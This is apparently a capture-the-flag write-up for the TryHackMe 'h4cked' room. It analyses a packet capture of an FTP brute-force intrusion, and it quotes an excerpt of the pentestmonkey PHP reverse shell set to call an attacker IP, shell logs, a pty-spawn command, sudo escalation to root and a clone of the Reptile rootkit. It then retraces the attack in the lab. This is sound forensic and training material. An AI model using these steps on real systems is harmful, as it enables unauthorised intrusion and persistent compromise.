
[TryHackMe Link](https://tryhackme.com/room/h4cked){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 10"
  # Nmap 7.93 scan initiated Wed Mar  1 20:02:56 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.199.134
    Nmap scan report for 10.10.199.134
    Host is up (0.15s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 2.0.8 or later
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=3/1%OT=21%CT=1%CU=42710%PV=Y%DS=5%DC=I%G=Y%TM=63FFF5E2
    OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=
    OS:A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M5
    OS:05ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B
    OS:3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
    OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
    OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
    OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
    OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
    OS:40%CD=S)

    Network Distance: 5 hops

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Mar  1 20:03:30 2023 -- 1 IP address (1 host up) scanned in 33.71 seconds

  ```

## <b>Task 1</b>

- [x] It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it. <a href="../assets/Capture.pcapng">Download the file here</a>

- [x] The attacker is trying to log into a specific service. What service is this? **`FTP`**
    
    As I traced the TCP stream, I found the following:
    ```s
    220 Hello FTP World!
    USER jenny
    331 Please specify the password.
    PASS password
    530 Login incorrect.
    USER jenny
    331 Please specify the password.
    PASS 666666
    530 Login incorrect.
    ```

- [x] There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool? **`Hydra`**
  
- [x] The attacker is trying to log on with a specific username. What is the username? **`Jenny`**
    
- [x] What is the user's password? 
    
    ```s linenums="1" hl_lines="6 8 9"
    220 Hello FTP World!
    USER jenny
    331 Please specify the password.
    PASS 111111
    530 Login incorrect.
    USER jenny
    331 Please specify the password.
    PASS [REDACTED]
    230 Login successful.
    ```

- [x] What is the current FTP working directory after the attacker logged in? **`/var/www/html`**
  
- [x] The attacker uploaded a backdoor. What is the backdoor's filename? **`shell.php`**

  ```s linenums="1" hl_lines="9 19 22"
    220 Hello FTP World!
    USER jenny
    331 Please specify the password.
    PASS [REDACTED]
    230 Login successful.
    SYST
    215 UNIX Type: L8
    PWD
    257 "/var/www/html" is the current directory
    PORT 192,168,0,147,225,49
    200 PORT command successful. Consider using PASV.
    LIST -la
    150 Here comes the directory listing.
    226 Directory send OK.
    TYPE I
    200 Switching to Binary mode.
    PORT 192,168,0,147,196,163
    200 PORT command successful. Consider using PASV.
    STOR shell.php
    150 Ok to send data.
    226 Transfer complete.
    SITE CHMOD 777 shell.php
    200 SITE CHMOD command ok.
    QUIT
    221 Goodbye.
  ```

- [x] The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL? **`http://pentestmonkey.net/tools/php-reverse-shell`**
  
  ```php linenums="1" hl_lines="14"
    <?php
    // php-reverse-shell - A Reverse Shell implementation in PHP
    // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
    //
    // This tool may be used for legal purposes only.  Users take full responsibility
    // for any actions performed using this tool.  The author accepts no liability
    // for damage caused by this tool.  If these terms are not acceptable to you, then
    // do not use this tool.
    .
    .
    .
    // Usage
    // -----
    // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '192.168.0.147';  // CHANGE THIS
    $port = 80;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
  ```

- [x] Which command did the attacker manually execute after getting a reverse shell? **`whoami`**
    
    ```s linenums="1" hl_lines="7"
    Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    $ ls -la
    ``` 

- [x] What is the computer's hostname? **`wir3`**
- [x] Which command did the attacker execute to spawn a new TTY shell? 
    **`python3 -c 'import pty; pty.spawn("/bin/bash")'`**
- [x] Which command was executed to gain a root shell? **`sudo su`**

    ```s linenums="1" hl_lines="1 2 16"
    $ python3 -c 'import pty; pty.spawn("/bin/bash")'
    www-data@wir3:/$ su jenny
    su jenny
    Password: [REDACTED]

    jenny@wir3:/$ sudo -l
    sudo -l
    [sudo] password for jenny: [REDACTED]

    Matching Defaults entries for jenny on wir3:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User jenny may run the following commands on wir3:
        (ALL : ALL) ALL
    jenny@wir3:/$ sudo su
    sudo su
    root@wir3:/# whoami
    whoami
    root
    root@wir3:/# cd
    ```

- [x] The attacker downloaded something from GitHub. What is the name of the GitHub project? **`Reptile`**

    ```s linenums="1" hl_lines="2 3"
    cd
    root@wir3:~# git clone https://github.com/f0rb1dd3n/Reptile.git
    git clone https://github.com/f0rb1dd3n/Reptile.git
    Cloning into 'Reptile'...
    remote: Enumerating objects: 217, done..[K
    remote: Counting objects:   0% (1/217).[K
    remote: Counting objects:   1% (3/217).[K
    ```

- [x] The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called **`Rootkit`**

## <b>Task 2</b>

While using the Hydra tool to perform a brute force attack on the FTP service, I was able to discover that the password for Jenny.

<img id="image1" />

I uploaded my reverse shell replacing the one in webserver and accessed through browser. I concurrently launched a listener to intercept the incoming shell.

<img id="image2" />

By utilizing the credentials discovered in Task-1, I logged in as `Jenny` using **`su jenny`**. As Jenny possessed access to all commands in Linux, I executed **`sudo su`** to escalate my privileges to root.

<img id="image3" />

I accessed the flag.txt file located in the Reptile directory and read its contents.

<img id="image4" />

<script>

// JSON object
const data = {
    "desc": "Find out what happened by analysing a .pcap file and hack your way back into the machine",
    "ip":  "10.10.199.134",
    "ports": "21/tcp,ftp,vsftpd 2.0.8 or later;80/tcp,http,Apache httpd 2.4.29 ((Ubuntu))",
    "difficulty":"easy",
    "id": "9"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }

}

updateHTML();
</script>